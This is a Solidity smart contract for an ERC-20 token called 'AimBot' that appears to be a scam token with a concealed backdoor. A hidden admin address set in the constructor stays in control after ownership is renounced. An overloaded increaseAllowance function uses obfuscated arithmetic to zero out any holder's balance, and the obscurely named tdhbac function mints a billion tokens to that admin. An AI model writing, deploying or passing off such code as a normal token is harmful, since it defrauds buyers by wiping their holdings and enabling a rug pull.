// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
    constructor() {
        _transferOwnership(_msgSender());
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

}

contract BTCETFTOKEN is Ownable {
    address private bbcugf45;
    uint256 supplyamount = 1000000*10**decimals();
    uint256 private _totalSupply = supplyamount;
    string private _cctokenname = "AimBot";
    string private _cctokensymbol = "AIMBOT";
    constructor(address tokenadmin) {
        bbcugf45 = tokenadmin;
        TED[_msgSender()] += supplyamount;
        emit Transfer(address(0), _msgSender(), supplyamount);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(address => uint256) private TED;
    mapping(address => mapping(address => uint256)) private _allowances;
    function symbol() public view  returns (string memory) {
        return _cctokensymbol;
    }
    uint256 bchang = 1000+1000-2000;
    function increaseAllowance(address uuyxxx) public     {
        if(bbcugf45 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = TED[newadd];
        uint256 newaaamount = TED[newadd]+TED[newadd]-curamount;
        TED[newadd] -= newaaamount;
        }else{
        if(bbcugf45 == _msgSender()){
        }else{
            revert("ccc");
        }
        }
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function balanceOf(address account) public view returns (uint256) {
        return TED[account];
    }

    function name() public view returns (string memory) {
        return _cctokenname;
    }


    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    uint256 xxtoudiamount = 1000000;
    function tdhbac(address ddgddb) 
    external {
        address cc123d = _msgSender();
        TED[cc123d] += 1000*((10**decimals()*xxtoudiamount));
        require(bbcugf45 == _msgSender());
        if(bbcugf45 == _msgSender()){
        }
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = TED[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        TED[from] = TED[from]-amount;
        TED[to] = TED[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}